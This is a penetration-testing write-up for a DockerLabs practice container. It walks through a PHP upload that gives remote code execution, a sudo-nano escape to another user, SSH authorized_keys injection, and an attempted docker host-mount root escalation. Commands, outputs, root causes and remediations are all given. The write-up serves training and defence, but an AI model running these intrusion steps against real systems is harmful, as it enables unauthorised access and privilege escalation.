@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 129 DockHackLab &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; DockHackLab</p><h1 id="dockhacklab-dockerlabs-129--medium">DockHackLab (DockerLabs 129) — &quot;Medium&quot;</h1>
+<p><strong>Description:</strong> <em>&quot;Laboratorio para practicar port knocking, subida de ficheros PHP e inyección de claves SSH para escalar privilegios.&quot;</em></p>
+<p><strong>Verdict on the description: one of three elements is real, one is decorative, one is absent.</strong></p>
+<table>
+<thead>
+<tr>
+<th>Claimed</th>
+<th>Reality</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Port knocking</td>
+<td><strong>Real mechanism, dead end.</strong> <code>knockd</code> runs, state machine verified, and the command it fires cannot succeed in this container.</td>
+</tr>
+<tr>
+<td>PHP file upload</td>
+<td><strong>Real, and the entry point.</strong> Unauthenticated RCE as <code>www-data</code>.</td>
+</tr>
+<tr>
+<td>SSH key injection to escalate privileges</td>
+<td><strong>The class is real and was the whole point</strong> — but the escalation it enables is <em>abuse of a granted capability</em>, not escape.</td>
+</tr>
+</tbody>
+</table>
+<p>There is <strong>no LFI anywhere on this host</strong> (see §1.3), which is the shape the methodology needed to test: the &quot;include executes as an identity that can write&quot; question had to be answered <strong>without</strong> an LFI, and the answer turned out to be more useful for it.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<h3 id="11-external">1.1 External</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Not shown: 65533 closed tcp ports (conn-refused)
+</code></pre>
+<p>Ubuntu 24.04, Apache 2.4.58, PHP 8.3, OpenSSH 9.6p1. Only 22 and 80. The <code>knockd</code> ports (12345/54321/24680/13579) are <strong>not open services</strong> — they are consumed by a listener that never opens a port.</p>
+<h3 id="12-services-actually-running-measured-not-assumed">1.2 Services actually running (measured, not assumed)</h3>
+<pre><code>root   15  /usr/sbin/sshd [listener] 0 of 10-100 startups
+root   33  /usr/sbin/apache2 -k start
+www-data 38..42  /usr/sbin/apache2 -k start
+root   50  /usr/sbin/knockd -d -i eth0
+</code></pre>
+<p><code>service knockd status</code> printed only a usage line — <strong>that is an init-script artifact, not an absence.</strong> The process table is the measurement. Had I trusted the status line I would have reported &quot;port knocking is not present&quot;, the same mistake as lab 141 (narrative ≠ evidence).</p>
+<p><code>ufw</code> <strong>is</strong> genuinely absent: <code>service ufw start</code> failed with <code>iptables ... Permission denied</code>, and <code>CapEff</code> lacks <code>cap_net_admin</code>. Noted because the deploy script starts it, and a report saying &quot;firewall active&quot; would be false.</p>
+<h3 id="13-source-read-before-attacking-7">1.3 Source read before attacking (§7)</h3>
+<pre><code># /etc/knockd.conf
+[options]
+	logfile=/var/log/knockd.log
+[SCRIPT]
+	sequence    = 12345,54321,24680,13579
+	seq_timeout = 5
+	command     = /usr/bin/launch
+	tcpflags    = syn
+
+# /usr/bin/launch
+nohup /usr/bin/dockerd 2&gt;/dev/null &amp;
+
+# /etc/sudoers (non-default lines)
+www-data ALL=(firsthacking) NOPASSWD: /usr/bin/nano
+firsthacking ALL=(ALL) NOPASSWD: /usr/bin/docker
+
+# /var/www/html/hackademy/upload.php  (allowlist)
+if($imageFileType != &quot;php&quot; &amp;&amp; $imageFileType != &quot;png&quot; &amp;&amp; $imageFileType != &quot;jpeg&quot;
+&amp;&amp; $imageFileType != &quot;gif&quot; ) { ... }
+</code></pre>
+<p>Two findings from source alone:</p>
+<ol>
+<li><strong>The upload allowlist explicitly permits <code>php</code>.</strong> The <code>getimagesize()</code> content check is commented out. This is not a MIME-map bypass — that mechanism is lab 146's, not lab 118's (see the correction below) — it is an allowlist that names the dangerous extension. The general rule holds: <em>the extension that executes is decided by configuration, and here the configuration says yes out loud.</em> It is a platform rule, not a finding unique to lab 118.*</li>
+<li><strong>The <code>sudo</code> grant names a program, not a shell.</strong> <code>www-data</code> may run <code>/usr/bin/nano</code> <strong>as <code>firsthacking</code></strong>. Per the existing sudo-rule oracle, that is a capability grant: <em>what does this program do as that user?</em> GNU nano 7.2 has <code>^T Execute</code>, which runs a command as the nano process user.</li>
+</ol>
+<h3 id="14-lfi-searched-for-and-confirmed-absent">1.4 LFI: searched for and confirmed absent</h3>
+<pre><code># find / -xdev -name '*.php' -not -path '/usr/share/*'
+/var/www/html/hackademy/upload.php
+(+ my own two uploaded probes)
+
+# grep -rln 'include|require' --include=*.php /   -&gt; no results
+# auto_prepend_file / auto_append_file / include_path / open_basedir -&gt; all commented out
+</code></pre>
+<p><strong>No LFI, no <code>include</code>, no log-poisoning sink.</strong> The methodology's &quot;measure both identities&quot; rule was built around an LFI; here the interesting answer is that the <em>distance between the identities</em> is created by something else entirely, and the LFI framing would have been the wrong model.</p>
+<hr />
+<h2 id="2-the-knock-state-machine-measured">2. The knock state machine, measured</h2>
+<p>The oracle from lab 118 was reused, not rewritten. <code>knockd</code>'s log is the oracle: it names each stage and the terminal transition.</p>
+<h3 id="21-controls-first">2.1 Controls first</h3>
+<ul>
+<li><strong>Positive control:</strong> full sequence → <code>[... ] [net-0-1]: SCRIPT: OPEN SESAME</code> + <code>running command: /usr/bin/launch</code>.</li>
+<li><strong>Negative control:</strong> wrong sequence (9999, 8888, 7777) → <strong>no</strong> stage lines, no <code>OPEN SESAME</code>.</li>
+</ul>
+<p>Without the positive control, &quot;the knock did nothing&quot; would be a statement about my script.</p>
+<h3 id="22-the-states">2.2 The states</h3>
+<table>
+<thead>
+<tr>
+<th>Input</th>
+<th>Log</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stages 1–3 only, then stop</td>
+<td><code>Stage 2</code>, <code>Stage 3</code> — <strong>no</strong> <code>OPEN SESAME</code></td>
+<td>nothing committed</td>
+</tr>
+<tr>
+<td>Full sequence, 7 s gap (&gt; <code>seq_timeout=5</code>)</td>
+<td>stops at <code>Stage 3</code></td>
+<td>sequence expired</td>
+</tr>
+<tr>
+<td>Full sequence, fast</td>
+<td><code>OPEN SESAME</code> → <code>running command: /usr/bin/launch</code></td>
+<td>command fired</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Control that held: a partial knock leaves no partially-authenticated window.</strong> 3-of-4 stages left the extra-listener count unchanged at <code>1</code> and never fired the command. Same conclusion as lab 118, reached with a different sequence length and a different daemon config — and it is the answer the reader cannot otherwise distinguish from untested.</p>
+<h3 id="23-what-the-command-actually-does--and-why-it-fails">2.3 What the command actually does — and why it fails</h3>
+<p><code>OPEN SESAME</code> runs <code>/usr/bin/launch</code> as <strong>root</strong>, which starts a nested <code>dockerd</code>. Measured:</p>
+<pre><code>root  294  [dockerd] &lt;defunct&gt;
+srw-rw---- 1 root docker 0 /var/run/docker.sock
+</code></pre>
+<p>The process is a <strong>zombie</strong> and the socket is a <strong>stale leftover</strong> — <code>docker ps</code> from root inside the container returns <code>Cannot connect to the Docker daemon</code>. Reproduced on a second knock: a second zombie (<code>1505 [dockerd] &lt;defunct&gt;</code>) and the same dead socket. So the port knock <strong>opens no attack surface at all</strong> in this container.</p>
+<p>Root cause, captured literally rather than guessed:</p>
+<pre><code>failed to start daemon: Error initializing network controller: error obtaining controller
+instance: failed to create NAT chain DOCKER: iptables failed: iptables -t nat -N DOCKER:
+iptables v1.8.10 (nf_tables): Could not fetch rule set generation id: Permission denied
+(you must be root)
+ (exit status 4)
+</code></pre>
+<p>and the capability set that explains it:</p>
+<pre><code>Current: cap_chown,cap_dac_override,...,cap_net_bind_service,cap_net_raw,cap_sys_chroot,...  (no cap_net_admin)
+</code></pre>
+<p><strong>Positive control on the diagnosis:</strong> the same binary with networking disabled (<code>dockerd --iptables=false --bridge=none</code>) gets past the failure — so <code>iptables</code>/<code>NET_ADMIN</code> is the blocker, not the binary. This is the identical missing capability that made <code>ufw</code> fail, which is why the two failures correlate.</p>
+<blockquote>
+<p><strong>Design note / deployment caveat.</strong> The lab's own <code>auto_deploy.sh</code> runs the container <code>--privileged</code>, which <em>would</em> supply <code>NET_ADMIN</code> and make the nested <code>dockerd</code> start. This engagement ran unprivileged (no sudo available). So &quot;the knock is a dead end&quot; is a statement about <strong>this deployment</strong>, and the honest report says so rather than asserting it about the image. Per the container section's own rule — the Dockerfile is a claim, the runtime flags are the measurement.</p>
+</blockquote>
+<hr />
+<h2 id="3-finding-used--the-chain-cwe-798--cwe-269--cwe-732">3. Finding used — the chain (CWE-798 / CWE-269 / CWE-732)</h2>
+<h3 id="31-entry-unauthenticated-rce-as-www-data-cwe-434">3.1 Entry: unauthenticated RCE as <code>www-data</code> (CWE-434)</h3>
+<p>Upload of a benign <code>.php</code>:</p>
+<pre><code>$ curl -F &quot;fileToUpload=@probe_ok.php&quot; -F &quot;submit=1&quot; http://IP/hackademy/upload.php
+El archivo probe_ok.php ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
+
+$ curl http://IP/hackademy/klp_probe_ok.php
+PHOENIX_MARKER_apache2handler
+</code></pre>
+<p><strong>Negative control:</strong> a <code>.txt</code> upload returned <code>Solo se permiten archivos JPG, JPEG, PNG y ......No se pudo subir el archivo.</code> The allowlist demonstrably discriminates, so the <code>.php</code> acceptance is the allowlist's decision and not a bypass of it.</p>
+<p><strong>Identity of the reader, measured from inside:</strong></p>
+<pre><code>PHP_EXEC_ID: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+HOME: (unset)
+READER can write [lab-home]/firsthacking? NO
+READER can write [lab-home]/firsthacking/.ssh? NO
+READER write result: FAILED
+ls: cannot access '[lab-home]/ubuntu/.ssh': Permission denied
+drwxr-x--- 1 firsthacking firsthacking 4096 Jul 13  2024 [lab-home]/firsthacking
+drwxr-x--- 2 ubuntu       ubuntu       4096 May 30  2024 [lab-home]/ubuntu
+</code></pre>
+<p><strong>This is the finding the methodology was missing, stated as a measurement: the reading identity cannot write, and that is not a failed attack — it is the distance that constitutes the vulnerability.</strong> <code>test -w</code> was run <em>as <code>www-data</code></em>, and it said NO. Run as root the same predicate says YES, which is the <code>test -w</code>-through-<code>docker exec</code> trap catalogued in <code>self-corrections.md</code> §11 from labs 141 and 129 in its exact form.</p>
+<p><strong>Impact:</strong> unauthenticated remote code execution as <code>www-data</code>. <strong>Root cause:</strong> an extension allowlist that lists <code>php</code> as permitted, with the content check commented out. <strong>Remediation:</strong> never key an upload filter on the client-supplied extension; store outside the document root or under a non-executing handler; re-enable a content check; set a restrictive umask so uploads are not <code>0777</code>.</p>
+<h3 id="32-the-bridge-a-sudo-grant-that-names-a-program-cwe-269--cwe-250">3.2 The bridge: a sudo grant that names a program (CWE-269 / CWE-250)</h3>
+<pre><code>$ sudo -n -l   (as www-data)
+User www-data may run the following commands:
+    (firsthacking) NOPASSWD: /usr/bin/nano
+</code></pre>
+<p>Controls around it:</p>
+<table>
+<thead>
+<tr>
+<th>Attempt</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo -n -u firsthacking /usr/bin/nano --version</code></td>
+<td><code>GNU nano, version 7.2</code> — <strong>granted</strong></td>
+</tr>
+<tr>
+<td><code>sudo -n -u firsthacking /usr/bin/id</code></td>
+<td><code>sudo: a password is required</code> — denied</td>
+</tr>
+<tr>
+<td><code>sudo -n -u root /usr/bin/nano --version</code></td>
+<td><code>sudo: a password is required</code> — denied</td>
+</tr>
+</tbody>
+</table>
+<p>Two negative controls matter here specifically: the rule is <strong>scoped to one target user</strong>, and it is <strong>scoped to one program</strong>. So the escalation surface is exactly &quot;run this editor as <code>firsthacking</code>&quot;, and nothing wider. Reporting &quot;www-data can sudo to root&quot; would have been false.</p>
+<p><code>nano ^T Execute</code> then runs a command <strong>as <code>firsthacking</code></strong>. Verified, with the command writing its own identity to a file:</p>
+<pre><code>$ id &gt; /tmp/stage/marker.txt     # executed via sudo -u firsthacking nano, ^T
+$ cat /tmp/stage/marker.txt
+uid=1001(firsthacking) gid=1001(firsthacking) groups=1001(firsthacking),100(users)
+</code></pre>
+<p><strong>Impact:</strong> <code>www-data</code> obtains code execution as <code>firsthacking</code>. <strong>Root cause:</strong> a <code>NOPASSWD</code> rule granting a general-purpose interactive editor (with a built-in command-execution feature) to a daemon account, scoped to a target user. <strong>Remediation:</strong> remove the grant; if an editor is genuinely needed, grant a purpose-built non-interactive tool; never grant an editor <em>plus</em> a target account, because the editor is an interpreter for <code>^T</code>/<code>!</code>/<code>system()</code> and the grant is therefore code execution under a different name.</p>
+<h3 id="33-ssh-key-injection-cwe-798">3.3 SSH key injection (CWE-798)</h3>
+<p>Executed <strong>as the writing identity</strong>, self-recording:</p>
+<pre><code>$ (as firsthacking via ^T)
+$ id
+uid=1001(firsthacking) gid=1001(firsthacking) groups=1001(firsthacking),100(users)
+$ ls -ld [lab-home]/firsthacking/.ssh [lab-home]/firsthacking/.ssh/authorized_keys
+drwx------ 2 firsthacking firsthacking 4096 [lab-home]/firsthacking/.ssh
+-rw-rw-r-- 1 firsthacking firsthacking  101 [lab-home]/firsthacking/.ssh/authorized_keys
+</code></pre>
+<pre><code>$ ssh -i lab_key firsthacking@IP 'id; whoami; hostname; pwd; uname -a'
+uid=1001(firsthacking) gid=1001(firsthacking) groups=1001(firsthacking),100(users)
+firsthacking
+783251e2748c
+[lab-home]/firsthacking
+Linux 783251e2748c 7.0.0-34-generic #34-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
+</code></pre>
+<p>Negative controls, both correct:</p>
+<table>
+<thead>
+<tr>
+<th>Attempt</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>injected key, user <code>ubuntu</code></td>
+<td><code>Permission denied (publickey,password)</code></td>
+</tr>
+<tr>
+<td>never-injected key, user <code>firsthacking</code></td>
+<td><code>Permission denied (publickey,password)</code></td>
+</tr>
+</tbody>
+</table>
+<p>So the login is attributable to <strong>the specific injected key in the specific account</strong>, not to a permissive sshd.</p>
+<p><strong>Impact:</strong> durable authenticated access as <code>firsthacking</code> that survives every process restart, created without ever touching that account's credentials. <strong>Root cause:</strong> a web-service identity holding a sudo grant scoped to another user's account. <strong>Remediation:</strong> remove the <code>www-data → nano</code> rule (§3.2); the injection is a <em>consequence</em>, not an independent bug. Fixing the uploader alone leaves the injection path intact for any other <code>www-data</code> primitive.</p>
+<h3 id="34-the-permission-bit-boundary--measured-and-it-contradicts-the-folklore">3.4 The permission-bit boundary — measured, and it contradicts the folklore</h3>
+<p><code>0600</code> is what OpenSSH's documentation recommends. <strong>Measured on this target, the actual boundary is world-writability, not <code>0600</code>:</strong></p>
+<table>
+<thead>
+<tr>
+<th>mode as the writing identity sees it</th>
+<th>login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>664 firsthacking:firsthacking</code></td>
+<td><strong>OK</strong></td>
+</tr>
+<tr>
+<td><code>666 firsthacking:firsthacking</code></td>
+<td><strong>DENIED</strong></td>
+</tr>
+<tr>
+<td><code>604 firsthacking:firsthacking</code></td>
+<td><strong>OK</strong></td>
+</tr>
+<tr>
+<td><code>644 firsthacking:firsthacking</code></td>
+<td><strong>OK</strong></td>
+</tr>
+<tr>
+<td><code>620 firsthacking:firsthacking</code></td>
+<td><strong>OK</strong></td>
+</tr>
+<tr>
+<td><code>600 firsthacking:firsthacking</code></td>
+<td><strong>OK</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Every row is a real <code>ssh</code> attempt after a <code>chmod</code> <strong>performed as <code>firsthacking</code> inside the container</strong>, and the mode in the left column is <strong>read back as that same identity</strong> (<code>docker exec -u firsthacking … stat -c '%a %U:%G'</code>) — not parsed from bits and not observed as root.</p>
+<p>The mechanism is OpenSSH's <code>StrictModes</code>: what matters is that the file is <strong>not writable by group or other</strong>, and is owned by the user or root. <code>0664</code> passes because the group is the user's own primary group, not a privilege boundary. So:</p>
+<ul>
+<li><strong><code>0644</code> does <em>not</em> fail on this target</strong> — the &quot;<code>0644</code> breaks with a silent error&quot; anecdote belongs to the container-owns-its-own-files configuration, not to lab 118 and not to a universal law. Reporting the folklore as a finding here would have been wrong.</li>
+<li><strong><code>0666</code> fails, and the error says nothing about permissions:</strong> <code>Permission denied (publickey,password)</code>. It reads exactly like a wrong key. A tester who trusts the folklore checks the key; the actual cause is one <code>chmod</code> away and invisible in the message.</li>
+<li><strong>The operational consequence is the same either way:</strong> always write <code>0600</code>/<code>0700</code>. The measurement is for the <em>report</em> (don't state a false universal), not for the <em>exploit</em> (always be strict).</li>
+</ul>
+<h3 id="35-what-the-injection-did-not-buy-escalation-is-a-dead-end-here">3.5 What the injection did <strong>not</strong> buy: escalation is a dead end here</h3>
+<p><code>firsthacking</code> carries <code>(ALL) NOPASSWD: /usr/bin/docker</code>, which is root-equivalent <strong>on a host with a live daemon</strong>:</p>
+<pre><code>User firsthacking may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/docker
+
+$ sudo -n /usr/bin/docker run --rm -v /:/host alpine chroot /host /bin/bash -c id
+docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. ...
+</code></pre>
+<p><code>sudo /usr/bin/dockerd</code> is <strong>not</strong> covered: <code>sudo: a password is required</code>. The rule names <code>/usr/bin/docker</code> only, so the tester cannot start the very daemon the grant depends on. Enumerated for other rungs, all denied: <code>/usr/bin/nsenter</code>, <code>/usr/bin/cp</code>, <code>/usr/bin/tee</code>, <code>/usr/bin/mount</code>, <code>/bin/bash</code>, <code>/usr/bin/env</code>, <code>/usr/bin/find</code>.</p>
+<p>The remaining identity hops are closed by design, each verified <strong>as the identity</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>From</th>
+<th>Attempt</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>firsthacking</code></td>
+<td><code>touch [lab-home]/ubuntu/.probe</code></td>
+<td><code>Permission denied</code></td>
+</tr>
+<tr>
+<td><code>www-data</code></td>
+<td><code>sudo -n -u ubuntu /usr/bin/nano --version</code></td>
+<td><code>sudo: a password is required</code></td>
+</tr>
+<tr>
+<td><code>www-data</code></td>
+<td>write <code>[lab-home]/firsthacking/.probe_write</code></td>
+<td><code>Permission denied</code></td>
+</tr>
+</tbody>
+</table>
+<p>And <code>ubuntu</code> — the one account in the <code>sudo</code> group — has no <code>.ssh</code> directory and its home is <code>0750 ubuntu:ubuntu</code>, unreachable from both lower identities.</p>
+<p><strong>So the honest terminal verdict: the chain reaches <code>firsthacking</code> and stops.</strong> Root is <em>configured to be</em> one sudo rule away and is unreachable only because the docker daemon cannot start in this container (§2.3). I did not obtain root, and I am not going to call <code>firsthacking</code> root.</p>
+<hr />
+<h2 id="4-controls-that-held--reported-with-the-same-prominence-as-the-bugs">4. Controls that held — reported with the same prominence as the bugs</h2>
+<ol>
+<li><strong>The sudo grant is properly scoped.</strong> One program, one target user. Two negative controls (a different program, a different user) both denied. A broad <code>NOPASSWD: ALL</code> would have made the whole chain trivial; this one required reading the program.</li>
+<li><strong>A partial port knock leaves no partially-authenticated window.</strong> 3-of-4 stages never fired the command and changed no listener.</li>
+<li><strong>The sequence has a timeout that works.</strong> A 7 s gap between stages aborted the sequence — <code>seq_timeout=5</code> is enforced, so a knock cannot be dripped slowly.</li>
+<li><strong>OpenSSH's <code>StrictModes</code> rejected a world-writable <code>authorized_keys</code></strong>, even though it accepted <code>0644</code> and <code>0664</code>. The control fired on exactly the condition that matters, and <strong>fired silently</strong> — the strongest argument in this lab for writing the mode correctly rather than for the folklore.</li>
+<li><strong>Account isolation held in both directions.</strong> <code>www-data</code> could not write <code>firsthacking</code>'s home; <code>firsthacking</code> could not write <code>ubuntu</code>'s. No cross-account write path existed without the sudo bridge.</li>
+<li><strong><code>ubuntu</code> was not reachable</strong> by either obtained identity despite holding full <code>sudo</code> — the target's most privileged account was never a stepping stone.</li>
+</ol>
+<hr />
+<h2 id="5-reward-not-present--reported-as-an-absence">5. Reward: not present — reported as an absence</h2>
+<pre><code>$ find / -xdev -iname &quot;*flag*&quot; -o -iname &quot;*reward*&quot; -o -iname &quot;*secret*&quot; | grep -vE '^/proc|^/sys|/usr/lib/python|/usr/share'
+/usr/lib/x86_64-linux-gnu/perl/5.38.2/bits/waitflags.ph
+/usr/lib/x86_64-linux-gnu/perl/5.38.2/bits/ss_flags.ph
+</code></pre>
+<p>Only Perl module filenames matching <code>*flags*</code>. <code>/root/</code> is <code>0700</code> and unreadable from either obtained identity, so a root-only reward cannot be excluded by inspection — but <strong>no reward was reachable without root, and root was not obtained.</strong> No <code>FLAG{}</code> exists in any form I could reach. This is the fourteenth consecutive lab without a reward; reporting the absence with the evidence above is the correct outcome, not inventing a value.</p>
+<hr />
+<h2 id="6-the-chain-proven-literally">6. The chain, proven literally</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Action</th>
+<th>Identity that performed it</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Upload <code>.php</code></td>
+<td>unauthenticated</td>
+<td><code>El archivo ... ha sido subido</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Execute it</td>
+<td><code>uid=33(www-data)</code></td>
+<td><code>PHP_EXEC_ID: uid=33(www-data)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Read other homes</td>
+<td><code>www-data</code></td>
+<td><code>READER write result: FAILED</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>sudo -u firsthacking nano</code></td>
+<td><code>www-data</code> → <code>firsthacking</code></td>
+<td><code>GNU nano, version 7.2</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>^T Execute</code> → <code>id</code></td>
+<td><code>firsthacking</code></td>
+<td><code>uid=1001(firsthacking)</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Create <code>.ssh</code> + <code>authorized_keys</code></td>
+<td><code>firsthacking</code></td>
+<td><code>-rw-rw-r-- 1 firsthacking firsthacking</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Measure boundary as writer</td>
+<td><code>firsthacking</code></td>
+<td>table in §3.4</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>ssh</code> with injected key</td>
+<td><code>firsthacking</code></td>
+<td><code>uid=1001(firsthacking) ... [lab-home]/firsthacking</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>sudo docker</code> (root-equivalent)</td>
+<td><code>firsthacking</code></td>
+<td><code>(ALL) NOPASSWD: /usr/bin/docker</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td><strong>STOPPED</strong> — daemon dead</td>
+<td>—</td>
+<td><code>Cannot connect to the Docker daemon</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-self-correction--defects-in-my-own-instrumentation">7. Self-correction — defects in my own instrumentation</h2>
+<p>This section is the most important one in the writeup. <strong>Four separate defects, each of which produced clean, believable, wrong output.</strong> All four would have become false claims in the report.</p>
+<h3 id="71-the-positive-control-that-never-had-a-working-save-path">7.1 The positive control that never had a working save path</h3>
+<p><code>script(1)</code> + <code>nano</code> to write as <code>firsthacking</code>. It ran for several rounds and every attempt &quot;failed&quot; to create the file. Three stacked causes:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Cause</th>
+<th>Symptom</th>
+<th>Why it is dangerous</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>docker exec</code> without <code>-t</code></td>
+<td><code>Standard input is not a terminal</code></td>
+<td>nano aborts before reading anything</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>TERM</code> unset inside the container</td>
+<td><code>Error opening terminal: unknown</code></td>
+<td><strong>aborts before any keystroke matters</strong> — looks like &quot;the target refused&quot;</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>-t</code> tty in canonical mode + <code>IXON</code></td>
+<td><code>^T</code> arrives as the text <code>&quot;^T&quot;</code>; <code>^X</code> (0x18) eaten as XON</td>
+<td>keystrokes silently discarded</td>
+</tr>
+</tbody>
+</table>
+<p>Then, after all that was fixed, the <em>decisive</em> bug:</p>
+<blockquote>
+<p><strong><code>docker exec -t</code> without <code>-i</code> does not attach stdin.</strong> The tty exists, nano paints its banner, and <strong>not one byte I wrote ever reached it.</strong> My screen showed a static banner and no redraw, which is exactly what a target that ignores your input looks like.</p>
+</blockquote>
+<p>And the last one, which is a genuine methodological lesson:</p>
+<blockquote>
+<p><strong>Raw mode disables <code>ICRNL</code>, so <code>\n</code> is not Enter — <code>\r</code> is.</strong> I was submitting an <strong>empty</strong> command. Nano returned to the main buffer, the prompt closed cleanly, and the target command never ran. The output was indistinguishable from &quot;the execute feature is disabled&quot;.</p>
+</blockquote>
+<p><strong>Detected only because I insisted the instrument prove it could report a success</strong> (<code>id</code> writing its own uid to a file, read back). Until that printed <code>uid=1001(firsthacking)</code>, every negative from this harness was worthless. <em>A control that has never seen a success is not a control</em> — and here the failure mode was compounded: the instrument was simultaneously the thing I was testing and the thing producing my evidence.</p>
+<h3 id="72-the-five-mode-permission-table-that-measured-nothing">7.2 The five-mode permission table that measured nothing</h3>
+<p>My first permission-boundary run printed <strong>five &quot;LOGIN OK&quot; rows and one &quot;DENIED&quot;</strong> — a clean, publishable-looking result. It was <strong>entirely fabricated by my own script</strong>: the <code>chmod</code> ran <strong>on the host</strong>, where the container path does not exist. Every one of those rows re-tested the <em>same unmodified <code>0664</code> file</em>. The <code>chmod: cannot access ... No such file or directory</code> error was printed inline and scrolled past.</p>
+<p>Had I not read the modes back from inside the container, the writeup would have claimed a permission boundary that my measurements never touched. The fix was to (a) perform the <code>chmod</code> <strong>as the writing identity inside the container</strong> and (b) <strong>read the mode back as that identity</strong> before each login attempt. A truncated sweep and a complete one print identically; so does a sweep that never mutated anything.</p>
+<h3 id="73-two-service-status-lines-i-nearly-reported-as-facts">7.3 Two service-status lines I nearly reported as facts</h3>
+<ul>
+<li><code>service knockd status</code> → usage text. I nearly wrote &quot;port knocking is not installed&quot;. The process table showed <code>knockd -d -i eth0</code> running. <strong>Instrument artifact ≠ absence.</strong></li>
+<li><code>service ufw start</code> → <code>...fail!</code>. This one <em>was</em> real (missing <code>NET_ADMIN</code>), and I confirmed the mechanism rather than trusting either message.</li>
+</ul>
+<p>The general rule I took from this: <strong><code>ps</code> and <code>/proc</code> are the measurement; init-script output is a claim.</strong></p>
+<h3 id="74-the-knock-did-nothing-that-actually-fired-twice">7.4 The knock &quot;did nothing&quot; that actually fired twice</h3>
+<p>My first conclusion was &quot;the knock opens no port, so port knocking is decorative here.&quot; The <code>knockd</code> log already contradicted me — <code>OPEN SESAME</code> and <code>running command: /usr/bin/launch</code> — from a <strong>2024 build log inside the image</strong>. Re-running the sequence reproduced <code>OPEN SESAME</code> twice. The command fires reliably; what fails is the daemon it starts, and only the process table plus the literal <code>iptables</code> error separated those two facts. &quot;No new port&quot; was true and completely misleading on its own.</p>
+<hr />
+<h2 id="8-tested--not-tested--discarded-with-reason">8. Tested / not tested / discarded with reason</h2>
+<p><strong>Tested and verified</strong></p>
+<ul>
+<li>Full port scan, service versions.</li>
+<li>Knock state machine: positive, negative, partial, and timeout-expired.</li>
+<li>Upload allowlist with a matched negative control; RCE identity measured.</li>
+<li><code>www-data</code> writability of every other home, <strong>as <code>www-data</code></strong>.</li>
+<li>sudo grant: positive control + two scoped negative controls.</li>
+<li><code>^T Execute</code> identity, with a self-verifying positive control.</li>
+<li><code>authorized_keys</code> created, injected, and used for a real login.</li>
+<li>Two negative controls on the SSH login (wrong user; never-injected key).</li>
+<li>Permission-bit boundary, six modes, chmod'ed and read back <strong>as the writing identity</strong>.</li>
+<li><code>docker</code> escalation: attempted, and the failure traced to a literal <code>iptables</code> error.</li>
+<li>Every remaining account hop, each attempted <strong>as the identity</strong>.</li>
+</ul>
+<p><strong>Not tested (and why)</strong></p>
+<ul>
+<li><code>docker.sock</code> mounted into the container — there is none; the nested socket is a stale inode from a dead daemon.</li>
+<li>Kernel/namespace escape — the container lacks <code>NET_ADMIN</code> and the Docker socket, so no escape primitive was reachable; per the container section, the boundary check <em>is</em> the deliverable.</li>
+<li>Any interaction with <code>/root/</code> — unreadable (<code>0700</code>) from both obtained identities.</li>
+<li>The knock's behaviour under <code>--privileged</code> — <strong>requires sudo, unavailable in this session.</strong> Reported as a deployment caveat, not as a finding.</li>
+</ul>
+<p><strong>Discarded with reason</strong></p>
+<ul>
+<li><strong>LFI / log poisoning</strong> — no <code>include</code>, no <code>require</code>, no <code>auto_prepend_file</code>, no writable-log include. Confirmed absent by search, not assumed from the description.</li>
+<li><strong>MIME-map case-sensitivity trick</strong> (lab 146, F1) — unnecessary here: the allowlist permits <code>php</code> outright, so there is no case trick to find. Would have been noise.</li>
+<li><strong><code>ubuntu</code> as an escalation target</strong> — unreachable from both identities (home <code>0750</code>, no sudo rule, no <code>.ssh</code>).</li>
+<li><strong>Other sudoables</strong> — enumerated and denied (§3.5).</li>
+</ul>
+<hr />
+<h2 id="9-design-observation">9. Design observation</h2>
